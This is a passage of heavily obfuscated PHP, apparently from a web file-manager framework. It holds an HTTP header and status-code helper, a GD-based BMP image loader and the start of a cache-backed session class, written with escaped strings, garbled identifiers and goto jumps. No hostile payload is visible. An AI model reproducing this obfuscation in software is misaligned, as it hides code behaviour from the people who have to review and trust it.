"\110\x54\x54\120\x5f\x4c\x41\x53\x54\137\x4d\117\x44\111\x46\x49\x45\x44", "\x49\146\x2d\x4d\x6f\144\x69\x66\151\145\144\55\123\x69\x6e\143\x65" => "\110\124\124\x50\x5f\111\x46\137\115\x4f\104\111\106\111\x45\104\137\x53\111\x4e\x43\105", "\111\146\x2d\x55\156\155\x6f\144\151\x66\151\145\144\55\123\x69\x6e\x63\145" => "\x48\x54\x54\x50\137\111\106\137\125\x4e\x4d\117\x44\111\x46\111\x45\104\x5f\x53\111\116\x43\x45", "\122\x61\x6e\147\145" => "\110\x54\x54\x50\137\x52\x41\x4e\107\x45", "\x54\x69\155\x65\157\165\x74" => "\x48\124\x54\120\137\124\x49\115\105\117\125\124", "\111\146" => "\x48\124\124\120\137\x49\x46", "\x4c\x6f\143\x6b\55\x54\x6f\153\x65\156" => "\x48\124\x54\120\137\x4c\x4f\x43\x4b\x5f\x54\117\113\x45\x4e", "\117\x76\x65\162\x77\x72\151\164\145" => "\x48\x54\124\x50\137\x4f\126\105\x52\x57\x52\x49\x54\105", "\x44\145\163\x74\x69\x6e\141\164\x69\157\156" => "\110\124\x54\120\x5f\104\105\123\124\x49\x4e\x41\124\x49\x4f\116", "\122\145\161\x75\145\163\x74\x2d\x49\x64" => "\122\x45\x51\125\105\123\124\x5f\x49\x44", "\x52\145\x71\x75\x65\163\x74\55\x42\157\144\171\x2d\106\x69\154\145" => "\x52\x45\x51\125\105\x53\124\x5f\x42\x4f\104\x59\x5f\106\x49\114\105", "\122\x65\x64\151\162\145\143\164\x2d\123\164\141\164\x75\163" => "\122\105\104\x49\122\105\x43\124\137\x53\124\101\x54\x55\123"); public static function init() { static $cè’ğÎƒÖ¿ = false; if ($cè’ğÎƒÖ¿) { return; } foreach ($_SERVER as $fôó×²ÂÆÉ => $eåÌ®Ú‚™) { $fôó×²ÂÆÉ = strtoupper($fôó×²ÂÆÉ); if (!array_key_exists($fôó×²ÂÆÉ, $_SERVER)) { continue; } $_SERVER[$fôó×²ÂÆÉ] = $eåÌ®Ú‚™; } foreach (self::$_headers as $fôó×²ÂÆÉ => $fÑÀ‚Ëµè¯) { if (!array_key_exists($fôó×²ÂÆÉ, $_SERVER)) { continue; } $_SERVER[$fôó×²ÂÆÉ] = $_SERVER[$fÑÀ‚Ëµè¯]; $_SERVER[strtoupper($fôó×²ÂÆÉ)] = $_SERVER[$fÑÀ‚Ëµè¯]; } } public static function get($e¥Ğ¬™ƒí) { self::init(); return $_SERVER[$e¥Ğ¬™ƒí] ? $_SERVER[$e¥Ğ¬™ƒí] : $_SERVER[$_SERVER[ã®Â„Éæ¹¤][1849] . strtoupper($e¥Ğ¬™ƒí)]; } public static function method() { return strtoupper(self::get($_SERVER[ã®Â„Éæ¹¤][154])); } public static function length() { $c³èÂÑ‘ÒÆ =& $_SERVER[ã®Â„Éæ¹¤]; $Bíå…âÛ¾Ó = self::get($c³èÂÑ‘ÒÆ[1850]); if (!$Bíå…âÛ¾Ó) { $Bíå…âÛ¾Ó = self::get($c³èÂÑ‘ÒÆ[1165]); } return $Bíå…âÛ¾Ó; } public static function range() { $B•¤ ®Ö†Â =& $_SERVER[ã®Â„Éæ¹¤]; $Cè¡–·Äç = self::get($B•¤ ®Ö†Â[198]); if (!$Cè¡–·Äç) { return !1; } if (!preg_match($B•¤ ®Ö†Â[1851], $Cè¡–·Äç, $BÂ¸¢ÀñÍâ)) { return !1; } if ($BÂ¸¢ÀñÍâ[1] === $B•¤ ®Ö†Â[33] && $BÂ¸¢ÀñÍâ[2] === $B•¤ ®Ö†Â[33]) { return !1; } return array($BÂ¸¢ÀñÍâ[1] !== $B•¤ ®Ö†Â[33] ? $BÂ¸¢ÀñÍâ[1] : null, $BÂ¸¢ÀñÍâ[2] !== $B•¤ ®Ö†Â[33] ? $BÂ¸¢ÀñÍâ[2] : null); } public static $statusCode = array("\61\60\60" => "\x43\157\156\164\151\x6e\165\145", "\x31\60\61" => "\123\x77\151\164\x63\150\x69\x6e\147\x20\x50\x72\x6f\164\x6f\143\x6f\154", "\61\x30\x32" => "\120\162\157\143\145\x73\163\151\156\x67", "\61\x30\63" => "\x45\141\162\x6c\171\x20\x48\151\156\x74\x73", "\x32\60\x30" => "\117\113", "\62\60\x31" => "\x43\162\145\141\x74\x65\144", "\62\60\62" => "\101\143\x63\145\160\x74\145\144", "\62\x30\x33" => "\116\157\x6e\x2d\101\x75\164\x68\x6f\162\x69\164\x61\164\x69\166\145\40\x49\x6e\146\157\x72\x6d\141\164\x69\157\x6e", "\x32\x30\64" => "\116\x6f\x20\x43\157\x6e\x74\x65\156\x74", "\62\60\65" => "\122\x65\x73\x65\164\x20\x43\157\156\164\x65\x6e\x74", "\x32\60\x36" => "\x50\x61\162\164\151\141\154\40\103\157\x6e\x74\x65\156\164", "\x32\60\x37" => "\115\x75\154\x74\x69\x2d\x53\164\141\x74\165\163", "\x33\x30\x30" => "\115\165\x6c\x74\151\x70\x6c\x65\x20\x43\150\157\x69\x63\145\x73", "\63\x30\61" => "\115\157\166\145\144\x20\x50\x65\x72\x6d\141\156\145\x6e\x74\154\171", "\x33\60\x32" => "\x46\157\165\x6e\x64", "\x33\x30\x33" => "\x53\145\145\40\117\x74\150\x65\x72", "\x33\x30\64" => "\x4e\x6f\x74\40\x4d\157\144\x69\146\151\145\x64", "\x33\x30\65" => "\125\163\x65\x20\x50\x72\157\x78\171", "\x33\60\x37" => "\x54\x65\155\160\x6f\162\x61\162\171\40\x52\145\x64\151\x72\145\143\164", "\63\x30\x38" => "\x50\x65\x72\x6d\141\x6e\x65\x6e\164\x20\122\x65\144\151\162\145\x63\164", "\64\60\x30" => "\102\x61\144\40\122\145\161\165\145\163\164", "\x34\60\61" => "\x55\x6e\x61\x75\x74\x68\x6f\x72\x69\172\x65\x64", "\x34\x30\x32" => "\120\x61\171\155\x65\156\164\40\x52\145\161\165\151\162\x65\x64", "\x34\x30\63" => "\106\157\x72\x62\151\x64\144\145\156", "\64\x30\x34" => "\116\157\164\40\106\157\165\156\x64", "\64\60\65" => "\x4d\x65\x74\150\157\x64\x20\x4e\x6f\164\x20\x41\154\154\157\x77\x65\144", "\64\x30\66" => "\x4e\157\x74\x20\x41\143\x63\145\x70\164\x61\x62\x6c\x65", "\64\60\67" => "\x50\162\157\x78\x79\x20\x41\165\164\150\145\156\164\151\x63\141\164\151\157\156\40\x52\145\161\x75\x69\x72\145\144", "\x34\x30\x38" => "\x52\x65\x71\x75\x65\x73\164\x20\124\151\155\x65\x6f\x75\164", "\64\x30\x39" => "\103\157\156\146\x6c\x69\x63\164", "\x34\x31\x30" => "\107\x6f\x6e\145", "\x34\61\x31" => "\114\145\x6e\147\x74\x68\x20\x52\145\x71\165\151\x72\145\x64", "\x34\61\62" => "\120\162\x65\143\x6f\x6e\x64\151\x74\151\157\x6e\40\106\141\151\x6c\145\x64", "\x34\61\63" => "\x52\x65\161\165\x65\x73\x74\40\x45\x6e\x74\x69\164\171\x20\x54\x6f\x6f\40\x4c\141\x72\x67\145", "\64\61\64" => "\x52\145\x71\165\x65\163\x74\x20\125\122\x49\40\x54\157\157\x20\114\x61\x72\147\145", "\x34\x31\x35" => "\125\x6e\x73\165\x70\160\157\162\164\x65\x64\x20\x4d\145\144\x69\x61\x20\124\x79\160\145", "\x34\x31\66" => "\122\145\x71\165\x65\163\164\145\144\x20\x52\141\156\147\x65\40\x4e\x6f\x74\x20\x53\x61\x74\x69\163\x66\151\141\142\154\x65", "\64\61\x37" => "\x45\170\160\145\x63\164\x61\x74\x69\x6f\x6e\x20\106\141\x69\154\x65\x64", "\x34\x32\x32" => "\x55\x6e\160\x72\x6f\143\145\x73\x73\141\142\x6c\x65\x20\x45\x6e\164\x69\164\171", "\x34\x32\63" => "\x4c\x6f\x63\153\x65\x64", "\x34\x32\x34" => "\x46\141\x69\154\145\144\x20\104\x65\x70\x65\156\x64\x65\x6e\x63\x79", "\x34\x32\65" => "\x55\x6e\x6f\x72\144\x65\162\x65\144\x20\103\x6f\x6c\154\145\143\164\151\157\156", "\64\x32\66" => "\x55\x70\147\162\141\144\145\40\122\x65\161\x75\151\162\x65\x64", "\64\x32\70" => "\120\162\x65\x63\x6f\156\x64\151\164\x69\x6f\x6e\40\x52\145\x71\x75\x69\x72\145\144", "\64\62\x39" => "\124\157\x6f\40\115\x61\156\x79\40\122\145\x71\x75\x65\x73\x74\x73", "\x34\63\x31" => "\122\145\161\x75\x65\163\x74\40\110\x65\x61\x64\x65\162\x20\x46\151\145\154\x64\163\x20\x54\x6f\x6f\40\x4c\141\x72\147\x65", "\x34\x34\x34" => "\x4e\x6f\40\122\x65\x73\160\x6f\x6e\163\145", "\x34\65\x30" => "\x42\x6c\x6f\x63\153\x65\144\40\x62\171\x20\127\151\x6e\144\x6f\x77\x73\40\120\x61\162\145\156\x74\141\x6c\40\x43\157\x6e\x74\x72\x6f\x6c\163", "\64\x35\61" => "\x55\x6e\x61\x76\x61\x69\154\141\x62\x6c\x65\40\106\157\162\x20\114\x65\x67\x61\x6c\x20\x52\x65\141\163\x6f\156\x73", "\x34\x39\x34" => "\x52\145\x71\x75\x65\x73\x74\40\x48\x65\141\144\x65\162\x20\x54\157\x6f\x20\114\141\x72\147\145", "\x35\x30\60" => "\111\x6e\x74\145\x72\x6e\141\154\x20\x53\x65\x72\166\x65\x72\40\105\x72\x72\x6f\162", "\x35\x30\x31" => "\116\157\x74\40\111\x6d\x70\x6c\x65\x6d\145\x6e\x74\145\x64", "\65\x30\x32" => "\x42\x61\x64\x20\107\x61\x74\x65\x77\141\x79", "\x35\60\x33" => "\123\x65\x72\x76\x69\143\x65\x20\x55\156\x61\x76\141\x69\x6c\x61\x62\154\145", "\65\x30\x34" => "\x47\141\164\145\167\141\x79\x20\x54\151\155\145\157\165\x74", "\65\x30\x35" => "\x48\x54\x54\120\x20\x56\145\x72\x73\x69\157\156\40\156\x6f\x74\x20\163\x75\x70\160\x6f\x72\x74\x65\144", "\65\60\67" => "\x49\156\163\x75\x66\x66\151\143\x69\x65\x6e\164\40\x53\x74\157\x72\x61\x67\x65"); public static function code($a†…±ªŠê) { $c¥ï¼¸Á« =& $_SERVER[ã®Â„Éæ¹¤]; $a†…±ªŠê = $a†…±ªŠê . $c¥ï¼¸Á«[33]; $AèøïŠáäÈ = self::$statusCode[$a†…±ªŠê]; $AèøïŠáäÈ = $AèøïŠáäÈ ? "\x48\x54\x54\120\x2f\x31\x2e\x31\40{$a†…±ªŠê}\40" . $AèøïŠáäÈ : $c¥ï¼¸Á«[33]; return $AèøïŠáäÈ; } } class ImageGdBMP { public static function load($aÉƒŸŠ¡„ã) { $DèÀƒ¼ÚÂÃ = fopen($aÉƒŸŠ¡„ã, $_SERVER[ã®Â„Éæ¹¤][1540]); if ($DèÀƒ¼ÚÂÃ === !1) { return !1; } $f½«¶ãò‰ = self::loadFromStream($DèÀƒ¼ÚÂÃ); fclose($DèÀƒ¼ÚÂÃ); return $f½«¶ãò‰; } public static function loadFromStream($eßÒŠ©Ô¦§) { $fÍ˜¨¿‹© =& $_SERVER[ã®Â„Éæ¹¤]; $bã®â‰ÃÍµ = fread($eßÒŠ©Ô¦§, 14); if ($bã®â‰ÃÍµ === !1) { return !1; } if ($bã®â‰ÃÍµ[0] != $fÍ˜¨¿‹©[1852] || $bã®â‰ÃÍµ[1] != $fÍ˜¨¿‹©[1853]) { return !1; } $F·ßİø™’ = unpack($fÍ˜¨¿‹©[1854] . $fÍ˜¨¿‹©[1855] . $fÍ˜¨¿‹©[1856] . $fÍ˜¨¿‹©[1857] . $fÍ˜¨¿‹©[1858], $bã®â‰ÃÍµ); return self::loadFromStreamAndFileHeader($eßÒŠ©Ô¦§, $F·ßİø™’); } public static function loadFromStreamAndFileHeader($DŸ²ĞŞ¸µˆ, array $aù—Œß¼ø) { goto c£¨âŞÆÕã; a½ÂÔ°—”: if ($eìèÇ²„Æ– == 0 || $F¡Ä™é¸ù· == 0 || $D…©¤Áğé” != 1 || ($D‹§¿‘é¦ & $a…¤æÌ¿¾‡) != 0 || ($D‹§¿‘é¦ & $C—é‡ê‹ª) != 0 || ($D‹§¿‘é¦ & $c°³ñÓ¸ğÚ) != 0 || ($a…¤æÌ¿¾‡ & $C—é‡ê‹ª) != 0 || ($a…¤æÌ¿¾‡ & $c°³ñÓ¸ğÚ) != 0 || ($C—é‡ê‹ª & $c°³ñÓ¸ğÚ) != 0) { return !1; } if ($cƒŒ×ËñÀ³ == 4 || $cƒŒ×ËñÀ³ == 5) { $Eø¶™¤³¯ã = stream_get_contents($DŸ²ĞŞ¸µˆ, $d­Æ…£†Ñç); if ($Eø¶™¤³¯ã === !1) { return !1; } return imagecreatefromstring($Eø¶™¤³¯ã); } $cğéƒ´Æ¤Å = $eìèÇ²„Æ– * $bœÇ§„› + 31 >> 3 & ~3; goto A†Ó³‹ÂìÄ; A†Ó³‹ÂìÄ: $bğŠ×¯ºÛ = abs($F¡Ä™é¸ù·); $a®ÚßÚ÷¼ä = $F¡Ä™é¸ù· > 0 ? $bğŠ×¯ºÛ - 1 : 0; $F¹ì˜·ŠÉ© = $F¡Ä™é¸ù· > 0 ? -1 : 1; goto F†™í¡ëˆ; c£¨âŞÆÕã: $fñŠ‹‡‚„ =& $_SERVER[ã®Â„Éæ¹¤]; if ($aù—Œß¼ø[$fñŠ‹‡‚„[388]] != 19778) { return !1; } $Eø¶™¤³¯ã = fread($DŸ²ĞŞ¸µˆ, 4); goto E›çÙôˆ¦; E›çÙôˆ¦: if ($Eø¶™¤³¯ã === !1) { return !1; } list(, $BöÓ£·…÷) = unpack($fñŠ‹‡‚„[1859], $Eø¶™¤³¯ã); if ($BöÓ£·…÷ == 12) { goto Cé‹“ìéå; aÓ£İ’¢¿—: $c°³ñÓ¸ğÚ = 255; goto d–¹ğ‰Œ; aŠåÇ†´Å½: $eöãìÚí‰Š = $D’ˆèƒåÂ = $D‹§¿‘é¦ = $cƒŒ×ËñÀ³ = 0; $a…¤æÌ¿¾‡ = 16711680; $C—é‡ê‹ª = 65280; goto aÓ£İ’¢¿—; Cé‹“ìéå: $Eø¶™¤³¯ã = fread($DŸ²ĞŞ¸µˆ, $BöÓ£·…÷ - 4); if ($Eø¶™¤³¯ã === !1) { return !1; } extract(unpack($fñŠ‹‡‚„[1860] . $fñŠ‹‡‚„[1861] . $fñŠ‹‡‚„[1862] . $fñŠ‹‡‚„[1863], $Eø¶™¤³¯ã)); goto aŠåÇ†´Å½; d–¹ğ‰Œ: } else { if (124 < $BöÓ£·…÷ || $BöÓ£·…÷ < 40) { return !1; } else { goto A¡È”‘©²; A¡È”‘©²: $Eø¶™¤³¯ã = fread($DŸ²ĞŞ¸µˆ, 36); if ($Eø¶™¤³¯ã === !1) { return !1; } extract(unpack($fñŠ‹‡‚„[1864] . $fñŠ‹‡‚„[1865] . $fñŠ‹‡‚„[1862] . $fñŠ‹‡‚„[1866] . $fñŠ‹‡‚„[1867] . $fñŠ‹‡‚„[1868] . $fñŠ‹‡‚„[1869] . $fñŠ‹‡‚„[1870] . $fñŠ‹‡‚„[1871] . $fñŠ‹‡‚„[1872], $Eø¶™¤³¯ã)); goto Aµ¼…¤ïÚõ; dËáÑ¿À¾•: if (($bœÇ§„› == 16 || $bœÇ§„› == 24 || $bœÇ§„› == 32) && $cƒŒ×ËñÀ³ == 0 && $a…¤æÌ¿¾‡ == 0 && $C—é‡ê‹ª == 0 && $c°³ñÓ¸ğÚ == 0) { switch ($bœÇ§„›) { case 16: $a…¤æÌ¿¾‡ = 31744; $C—é‡ê‹ª = 992; $c°³ñÓ¸ğÚ = 31; break; case 24: case 32: $a…¤æÌ¿¾‡ = 16711680; $C—é‡ê‹ª = 65280; $c°³ñÓ¸ğÚ = 255; break; } } goto F§Á’µâ î; eÅÇ²µ©©Ù: if ($bÆİå½†ø & 2147483648) { $bÆİå½†ø = -(~$bÆİå½†ø & 4294967295) - 1; } if ($aù—Œß¼ø[$fñŠ‹‡‚„[522]] != 0) { $Dñ§–ØŞº = $bœÇ§„› == 1 || $bœÇ§„› == 4 || $bœÇ§„› == 8 ? ($eöãìÚí‰Š ? $eöãìÚí‰Š : pow(2, $bœÇ§„›)) << 2 : 0; $Aâé™¶Ë§Ş = $d­Æ…£†Ñç ? $d­Æ…£†Ñç : ($eìèÇ²„Æ– * $bœÇ§„› + 31 >> 3 & ~3) * abs($F¡Ä™é¸ù·); $E«·í‹Åšï = $aù—Œß¼ø[$fñŠ‹‡‚„[522]] - $Aâé™¶Ë§Ş - $Dñ§–ØŞº - 14; if ($BöÓ£·…÷ < $E«·í‹Åšï && 40 <= $BöÓ£·…÷ && $BöÓ£·…÷ <= 124) { $BöÓ£·…÷ = $E«·í‹Åšï; } } if ($BöÓ£·…÷ - 40 > 0) { $Eø¶™¤³¯ã = fread($DŸ²ĞŞ¸µˆ, $BöÓ£·…÷ - 40); if ($Eø¶™¤³¯ã === !1) { return !1; } extract(unpack($fñŠ‹‡‚„[1873] . $fñŠ‹‡‚„[1874] . $fñŠ‹‡‚„[1875] . $fñŠ‹‡‚„[1876], $Eø¶™¤³¯ã . str_repeat($fñŠ‹‡‚„[1877], 120))); } else { $D‹§¿‘é¦ = $a…¤æÌ¿¾‡ = $C—é‡ê‹ª = $c°³ñÓ¸ğÚ = 0; } goto dËáÑ¿À¾•; Aµ¼…¤ïÚõ: if ($eìèÇ²„Æ– & 2147483648) { $eìèÇ²„Æ– = -(~$eìèÇ²„Æ– & 4294967295) - 1; } if ($F¡Ä™é¸ù· & 2147483648) { $F¡Ä™é¸ù· = -(~$F¡Ä™é¸ù· & 4294967295) - 1; } if ($E‘›â×»¡å & 2147483648) { $E‘›â×»¡å = -(~$E‘›â×»¡å & 4294967295) - 1; } goto eÅÇ²µ©©Ù; F§Á’µâ î: } } goto a½ÂÔ°—”; F†™í¡ëˆ: if ($bœÇ§„› == 1 || $bœÇ§„› == 4 || $bœÇ§„› == 8) { goto A›í¦Ö³Ä¥; c¶ˆÁ÷Š´: $dĞ¡ÌÃº å = (1 << $bœÇ§„›) - 1 << $C›îñ›óÒ’; if ($cƒŒ×ËñÀ³ == 1 || $cƒŒ×ËñÀ³ == 2) { $eÈ¼…‡Ö¤Ğ = 0; $e¡¶®¬é±§ = $bœÇ§„› >> 2 & 1; for (;;) { if ($eÈ¼…‡Ö¤Ğ < -1 || $eÈ¼…‡Ö¤Ğ > $eìèÇ²„Æ– || $a®ÚßÚ÷¼ä < -1 || $a®ÚßÚ÷¼ä > $F¡Ä™é¸ù·) { imagedestroy($F”í ìµ½…); return !1; } $Eø¶™¤³¯ã = fread($DŸ²ĞŞ¸µˆ, 1); if ($Eø¶™¤³¯ã === !1) { imagedestroy($F”í ìµ½…); return !1; } switch ($Eø¶™¤³¯ã) { case $fñŠ‹‡‚„[1877]: $Eø¶™¤³¯ã = fread($DŸ²ĞŞ¸µˆ, 1); if ($Eø¶™¤³¯ã === !1) { imagedestroy($F”í ìµ½…); return !1; } switch ($Eø¶™¤³¯ã) { case $fñŠ‹‡‚„[1877]: $a®ÚßÚ÷¼ä += $F¹ì˜·ŠÉ©; $eÈ¼…‡Ö¤Ğ = 0; break; case $fñŠ‹‡‚„[1879]: $a®ÚßÚ÷¼ä = 0; $eÈ¼…‡Ö¤Ğ = 0; break 3; case $fñŠ‹‡‚„[1880]: $Eø¶™¤³¯ã = fread($DŸ²ĞŞ¸µˆ, 2); if ($Eø¶™¤³¯ã === !1) { imagedestroy($F”í ìµ½…); return !1; } list(, $C¿ä—ÛÚ¨‡, $a×–˜‰àĞä) = unpack($fñŠ‹‡‚„[1881], $Eø¶™¤³¯ã); $eÈ¼…‡Ö¤Ğ += $C¿ä—ÛÚ¨‡; $a®ÚßÚ÷¼ä += $a×–˜‰àĞä * $F¹ì˜·ŠÉ©; break; default: list(, $d•‘Òïˆƒ‘) = unpack($fñŠ‹‡‚„[1882], $Eø¶™¤³¯ã); $D÷¨™ š¡š = ($d•‘Òïˆƒ‘ >> $e¡¶®¬é±§) + ($d•‘Òïˆƒ‘ & $e¡¶®¬é±§); $Eø¶™¤³¯ã = fread($DŸ²ĞŞ¸µˆ, $D÷¨™ š¡š + 1 & ~1); if ($Eø¶™¤³¯ã === !1) { imagedestroy($F”í ìµ½…); return !1; } for ($eöò¹Å ³“ = 0, $dËÊ…¢´µó = 0; $eöò¹Å ³“ < $d•‘Òïˆƒ‘; ++$eöò¹Å ³“, ++$eÈ¼…‡Ö¤Ğ, $dËÊ…¢´µó += $bœÇ§„›) { list(, $c½«³åïï) = unpack($fñŠ‹‡‚„[1882], $Eø¶™¤³¯ã[$dËÊ…¢´µó >> 3]); $BİÔ™õï­ = $dËÊ…¢´µó & 7; imagesetpixel($F”í ìµ½…, $eÈ¼…‡Ö¤Ğ, $a®ÚßÚ÷¼ä, $cùÙÖŸìÛŞ[($c½«³åïï & $dĞ¡ÌÃº å >> $BİÔ™õï­) >> $C›îñ›óÒ’ - $BİÔ™õï­]); } break; } break; default: $b§§Šô×ÌĞ = fread($DŸ²ĞŞ¸µˆ, 1); if ($b§§Šô×ÌĞ === !1) { imagedestroy($F”í ìµ½…); return !1; } list(, $B¨ Ø˜ÜˆÂ, $c½«³åïï) = unpack($fñŠ‹‡‚„[1881], $Eø¶™¤³¯ã . $b§§Šô×ÌĞ); for ($eöò¹Å ³“ = 0, $dËÊ…¢´µó = 0; $eöò¹Å ³“ < $B¨ Ø˜ÜˆÂ; ++$eöò¹Å ³“, ++$eÈ¼…‡Ö¤Ğ, $dËÊ…¢´µó += $bœÇ§„›) { $BİÔ™õï­ = $dËÊ…¢´µó & 7; imagesetpixel($F”í ìµ½…, $eÈ¼…‡Ö¤Ğ, $a®ÚßÚ÷¼ä, $cùÙÖŸìÛŞ[($c½«³åïï & $dĞ¡ÌÃº å >> $BİÔ™õï­) >> $C›îñ›óÒ’ - $BİÔ™õï­]); } break; } } } else { for ($a´µ³¿¹³ = 0; $a´µ³¿¹³ < $bğŠ×¯ºÛ; ++$a´µ³¿¹³, $a®ÚßÚ÷¼ä += $F¹ì˜·ŠÉ©) { $Eø¶™¤³¯ã = fread($DŸ²ĞŞ¸µˆ, $cğéƒ´Æ¤Å); if ($Eø¶™¤³¯ã === !1) { imagedestroy($F”í ìµ½…); return !1; } $dËÊ…¢´µó = 0; for ($eÈ¼…‡Ö¤Ğ = 0; $eÈ¼…‡Ö¤Ğ < $eìèÇ²„Æ–; ++$eÈ¼…‡Ö¤Ğ, $dËÊ…¢´µó += $bœÇ§„›) { list(, $c½«³åïï) = unpack($fñŠ‹‡‚„[1882], $Eø¶™¤³¯ã[$dËÊ…¢´µó >> 3]); $BİÔ™õï­ = $dËÊ…¢´µó & 7; imagesetpixel($F”í ìµ½…, $eÈ¼…‡Ö¤Ğ, $a®ÚßÚ÷¼ä, $cùÙÖŸìÛŞ[($c½«³åïï & $dĞ¡ÌÃº å >> $BİÔ™õï­) >> $C›îñ›óÒ’ - $BİÔ™õï­]); } } } goto B¨Úª—¦Âå; F†µÈ®‰Å°: $cùÙÖŸìÛŞ = array(); for ($eöò¹Å ³“ = 0; $eöò¹Å ³“ < $cÜÁÈšŠ·½; ++$eöò¹Å ³“) { $Eø¶™¤³¯ã = fread($DŸ²ĞŞ¸µˆ, $Dùªõßë§); if ($Eø¶™¤³¯ã === !1) { imagedestroy($F”í ìµ½…); return !1; } extract(unpack($fñŠ‹‡‚„[1878], $Eø¶™¤³¯ã . $fñŠ‹‡‚„[1877])); $cùÙÖŸìÛŞ[] = imagecolorallocate($F”í ìµ½…, $Cì©ôˆ…²õ, $cº„‡’²Û, $BİÔ™õï­); } $C›îñ›óÒ’ = 8 - $bœÇ§„›; goto c¶ˆÁ÷Š´; A›í¦Ö³Ä¥: $F”í ìµ½… = imagecreate($eìèÇ²„Æ–, $bğŠ×¯ºÛ); $Dùªõßë§ = $BöÓ£·…÷ == 12 ? 3 : 4; $cÜÁÈšŠ·½ = $eöãìÚí‰Š ? $eöãìÚí‰Š : pow(2, $bœÇ§„›); goto F†µÈ®‰Å°; B¨Úª—¦Âå: } else { goto D©ˆ…ïàµ; báĞ˜öàç: $B´‡¬Œ÷ó = $bœÇ§„› >> 3; $fñ¯íôŠ’‘ = $D‹§¿‘é¦ ? 127 : 0; $C……‰Ò©İ¡ = $D‹§¿‘é¦ ? 1 / $D‹§¿‘é¦ : 1; goto bĞ®œ’«‚¥; D©ˆ…ïàµ: $F”í ìµ½… = imagecreatetruecolor($eìèÇ²„Æ–, $bğŠ×¯ºÛ); imagealphablending($F”í ìµ½…, !1); if ($D‹§¿‘é¦) { imagesavealpha($F”í ìµ½…, !0); } goto báĞ˜öàç; bĞ®œ’«‚¥: $Cãù”à…¹ñ = $a…¤æÌ¿¾‡ ? 1 / $a…¤æÌ¿¾‡ : 1; $BçñåËÚ = $C—é‡ê‹ª ? 1 / $C—é‡ê‹ª : 1; $dôÓ°å¼÷ = $c°³ñÓ¸ğÚ ? 1 / $c°³ñÓ¸ğÚ : 1; goto fÄ¸ø´ò; fÄ¸ø´ò: for ($a´µ³¿¹³ = 0; $a´µ³¿¹³ < $bğŠ×¯ºÛ; ++$a´µ³¿¹³, $a®ÚßÚ÷¼ä += $F¹ì˜·ŠÉ©) { $Eø¶™¤³¯ã = fread($DŸ²ĞŞ¸µˆ, $cğéƒ´Æ¤Å); if ($Eø¶™¤³¯ã === !1) { imagedestroy($F”í ìµ½…); return !1; } $dËÊ…¢´µó = 0; for ($eÈ¼…‡Ö¤Ğ = 0; $eÈ¼…‡Ö¤Ğ < $eìèÇ²„Æ–; ++$eÈ¼…‡Ö¤Ğ, $dËÊ…¢´µó += $B´‡¬Œ÷ó) { list(, $c½«³åïï) = unpack($fñŠ‹‡‚„[1859], substr($Eø¶™¤³¯ã, $dËÊ…¢´µó, $B´‡¬Œ÷ó) . $fñŠ‹‡‚„[1883]); $A¥Ë¨‚£Îî = $c½«³åïï & $D‹§¿‘é¦; $b½ÌĞèö«Œ = $c½«³åïï & $a…¤æÌ¿¾‡; $C¸’ÃÜíÊ´ = $c½«³åïï & $C—é‡ê‹ª; $aµ†‡ÓËÓ = $c½«³åïï & $c°³ñÓ¸ğÚ; $E›ô‚‘áùƒ = $fñ¯íôŠ’‘ - (($A¥Ë¨‚£Îî << 7) - $A¥Ë¨‚£Îî) * $C……‰Ò©İ¡; $Cì©ôˆ…²õ = (($b½ÌĞèö«Œ << 8) - $b½ÌĞèö«Œ) * $Cãù”à…¹ñ; $cº„‡’²Û = (($C¸’ÃÜíÊ´ << 8) - $C¸’ÃÜíÊ´) * $BçñåËÚ; $BİÔ™õï­ = (($aµ†‡ÓËÓ << 8) - $aµ†‡ÓËÓ) * $dôÓ°å¼÷; imagesetpixel($F”í ìµ½…, $eÈ¼…‡Ö¤Ğ, $a®ÚßÚ÷¼ä, $E›ô‚‘áùƒ << 24 | $Cì©ôˆ…²õ << 16 | $cº„‡’²Û << 8 | $BİÔ™õï­); } } imagealphablending($F”í ìµ½…, !0); goto CãŠÍ„ó; CãŠÍ„ó: } return $F”í ìµ½…; goto cÀ«¶™ˆ²°; cÀ«¶™ˆ²°: } } goto f‡·ì”ÛëÆ; CÇï¾‹Ïöõ: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto BÌ¾¦‚Øš’; Bèñ›ºñ…: if (self::$sessionSign) { } else { if (Cookie::get($c“”¿°Şè)) { self::$sessionSign = Cookie::get($c“”¿°Şè); } else { self::$sessionSign = guid(); } } Cookie::setSafe($c“”¿°Şè, self::$sessionSign, self::$sessionTime); $C¤°ïÆĞ†‹ = $D‡êÌæ£Õ[$CÚ¢Ğô¿±ã[1418]]; goto FÀ¯‹ÕîÔò; BÌ¾¦‚Øš’: $CÚ¢Ğô¿±ã =& $_SERVER[ã®Â„Éæ¹¤]; static $C‡ó×¡¹É³ = false; if ($C‡ó×¡¹É³) { return $C‡ó×¡¹É³; } goto C¹Çù®¬‘ø; FÀ¯‹ÕîÔò: $cƒ‘ˆò±ëˆ = $D‡êÌæ£Õ[$C¤°ïÆĞ†‹]; $Cï·«¨…½¼ = $D‡êÌæ£Õ[$CÚ¢Ğô¿±ã[778]]; switch ($C¤°ïÆĞ†‹) { case $CÚ¢Ğô¿±ã[17]: self::$handle = Model($CÚ¢Ğô¿±ã[779]); break; case $CÚ¢Ğô¿±ã[780]: self::$handle = new CacheRedis($cƒ‘ˆò±ëˆ, $Cï·«¨…½¼); break; case $CÚ¢Ğô¿±ã[781]: self::$handle = new CacheMemcached($cƒ‘ˆò±ëˆ, $Cï·«¨…½¼); break; case $CÚ¢Ğô¿±ã[167]: $cƒ‘ˆò±ëˆ[$CÚ¢Ğô¿±ã[75]] = $cƒ‘ˆò±ëˆ[$CÚ¢Ğô¿±ã[75]] . $CÚ¢Ğô¿±ã[1419]; self::$handle = new CacheFile($cƒ‘ˆò±ëˆ, $Cï·«¨…½¼); default: break; } goto d‰Şì‹÷Ğ®; d‰Şì‹÷Ğ®: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $C‡ó×¡¹É³ = new self(); return $C‡ó×¡¹É³; goto fïÂ§£À¹İ; C¹Çù®¬‘ø: $D‡êÌæ£Õ = $GLOBALS[$CÚ¢Ğô¿±ã[6]][$CÚ¢Ğô¿±ã[337]]; self::$sessionTime = $D‡êÌæ£Õ[$CÚ¢Ğô¿±ã[1416]]; $c“”¿°Şè = isset($GLOBALS[$CÚ¢Ğô¿±ã[1417]]) ? $GLOBALS[$CÚ¢Ğô¿±ã[1417]] : SESSION_ID; goto 